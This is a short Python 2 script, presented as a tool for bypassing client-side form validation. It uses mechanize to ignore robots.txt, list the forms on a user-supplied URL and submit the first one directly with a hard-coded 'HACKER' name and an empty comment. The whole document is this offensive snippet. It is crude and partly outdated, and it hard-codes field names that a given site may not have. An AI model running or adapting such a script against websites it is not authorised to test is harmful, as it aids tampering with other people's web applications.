##This tool use for client-side validation bypass

import mechanize

br = mechanize.Browser()
br.set_handle_robots( False ) 
url = input("Enter URL ")
 
br.set_handle_equiv(True) 
br.set_handle_gzip(True) 
br.set_handle_redirect(True) 
br.set_handle_referer(True) 
br.set_handle_robots(False) 
br.open(url) 

for form in br.forms():
    print form
    
## bypass code based on values retreived 

br.select_form(nr=0) 
br.form['name'] = 'HACKER' 
br.form['comment'] = ''  
br.submit() 